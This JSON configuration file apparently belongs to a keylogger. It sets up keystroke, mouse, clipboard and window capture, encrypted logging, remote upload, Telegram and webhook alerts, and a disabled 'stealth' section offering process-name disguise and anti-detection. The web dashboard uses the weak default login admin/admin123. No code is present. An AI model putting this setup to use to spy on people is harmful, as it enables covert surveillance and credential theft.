{
  "logging": {
    "file_path": "logs/keylog.txt",
    "max_size_mb": 100,
    "buffer_size": 100,
    "flush_interval": 5.0,
    "enable_rotation": true,
    "enable_encryption": true,
    "backup_count": 5,
    "log_level": "INFO"
  },
  "encryption": {
    "enabled": true,
    "key_file": "encryption.key",
    "algorithm": "AES-256-GCM",
    "key_rotation_days": 30,
    "secure_delete": true
  },
  "features": {
    "keyboard_logging": true,
    "mouse_logging": true,
    "clipboard_logging": true,
    "screenshot_capture": false,
    "window_tracking": true,
    "application_monitoring": true,
    "network_monitoring": false,
    "file_monitoring": false
  },
  "privacy": {
    "filter_passwords": true,
    "filter_credit_cards": true,
    "filter_social_security": true,
    "filter_emails": false,
    "filter_urls": false,
    "sanitize_sensitive_data": true,
    "password_patterns": [
      "password",
      "passwd",
      "pwd",
      "pin",
      "secret",
      "key"
    ],
    "credit_card_pattern": "\\b(?:\\d{4}[\\s-]?){3}\\d{4}\\b",
    "ssn_pattern": "\\b\\d{3}-\\d{2}-\\d{4}\\b",
    "email_pattern": "\\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Z|a-z]{2,}\\b"
  },
  "performance": {
    "max_text_length": 1000,
    "flush_interval_seconds": 10,
    "typing_timeout_seconds": 2,
    "mouse_move_threshold": 10,
    "mouse_batch_size": 50,
    "clipboard_check_interval": 1.0,
    "memory_limit_mb": 500,
    "cpu_limit_percent": 10
  },
  "remote": {
    "enabled": false,
    "server_url": "",
    "api_key": "",
    "upload_interval_minutes": 60,
    "compress_uploads": true,
    "retry_attempts": 3,
    "timeout_seconds": 30
  },
  "alerts": {
    "enabled": false,
    "email_notifications": false,
    "telegram_notifications": false,
    "webhook_notifications": false,
    "alert_keywords": [
      "confidential",
      "secret",
      "password",
      "credit card"
    ],
    "email_config": {
      "smtp_server": "",
      "smtp_port": 587,
      "username": "",
      "password": "",
      "to_email": ""
    },
    "telegram_config": {
      "bot_token": "",
      "chat_id": ""
    },
    "webhook_config": {
      "url": "",
      "headers": {}
    }
  },
  "stealth": {
    "hide_console": false,
    "run_as_service": false,
    "process_name_disguise": "",
    "startup_delay_seconds": 0,
    "anti_detection": false,
    "minimize_footprint": true
  },
  "web": {
    "enabled": true,
    "host": "127.0.0.1",
    "port": 5000,
    "debug": false,
    "auth_required": true,
    "username": "admin",
    "password": "admin123",
    "ssl_enabled": false,
    "ssl_cert_path": "",
    "ssl_key_path": "",
    "session_timeout_minutes": 30
  },
  "screenshots": {
    "enabled": false,
    "interval_seconds": 300,
    "quality": 85,
    "format": "JPEG",
    "max_width": 1920,
    "max_height": 1080,
    "storage_path": "screenshots/",
    "compress": true,
    "encrypt": true
  },
  "system": {
    "auto_start": false,
    "check_updates": false,
    "telemetry": false,
    "debug_mode": false,
    "log_system_events": true,
    "monitor_system_changes": false
  }
}